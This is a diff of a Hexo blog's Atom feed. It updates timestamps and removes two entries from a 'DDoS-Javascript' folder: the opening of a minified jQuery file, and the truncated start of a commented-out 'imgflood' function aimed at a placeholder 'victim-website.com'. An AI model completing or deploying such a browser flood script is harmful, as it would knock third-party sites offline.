@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://magic-king.net/"/>
-  <updated>2019-12-03T12:08:32.822Z</updated>
+  <updated>2019-12-12T07:57:24.579Z</updated>
   <id>http://magic-king.net/</id>
   
   <author>
@@ -15,54 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title></title>
-    <link href="http://magic-king.net/2019/12/12/DDoS-Javascript/jquery-1.10.2.min/"/>
-    <id>http://magic-king.net/2019/12/12/DDoS-Javascript/jquery-1.10.2.min/</id>
-    <published>2019-12-12T07:51:08.388Z</published>
-    <updated>2019-12-03T12:08:32.822Z</updated>
-    
-    <summary type="html">
-    
-      
-      
-        /*! jQuery v1.10.2 | (c) 2005, 2013 jQuery Foundation, Inc. | jquery.org/license
-//@ sourceMappingURL=jquery-1.10.2.min.map
-*/
-(function(e,t){var n,r,i=typeof t
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="http://magic-king.net/2019/12/12/DDoS-Javascript/fuck/"/>
-    <id>http://magic-king.net/2019/12/12/DDoS-Javascript/fuck/</id>
-    <published>2019-12-12T07:51:08.325Z</published>
-    <updated>2019-12-03T11:55:55.824Z</updated>
-    
-    <summary type="html">
-    
-      
-      
-        
-&lt;head&gt;&lt;meta name=&quot;generator&quot; content=&quot;Hexo 3.8.0&quot;&gt;
-&lt;!--&lt;script type=&#39;text/javascript&#39;&gt;
-function imgflood(){
-	//var TARGET = &#39;victim-website.com&#39;
-	var TARGET = 
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
   
   <entry>
     <title>DDoS-JavaScript</title>
@@ -577,11 +529,11 @@ function imgflood(){
     <link href="http://magic-king.net/2019/05/27/LOVE/"/>
     <id>http://magic-king.net/2019/05/27/LOVE/</id>
     <published>2019-05-27T12:13:14.000Z</published>
-    <updated>2019-12-10T01:50:30.931Z</updated>
+    <updated>2019-12-21T02:00:40.140Z</updated>
     
     <summary type="html">
     
-      It is Magic.&lt;/br&gt;the content has been encrypted, enter the password to read.&lt;/br&gt;
+      It is Magic.&lt;br&gt;the content has been encrypted, enter the password to read.&lt;br&gt;
     
     </summary>
     
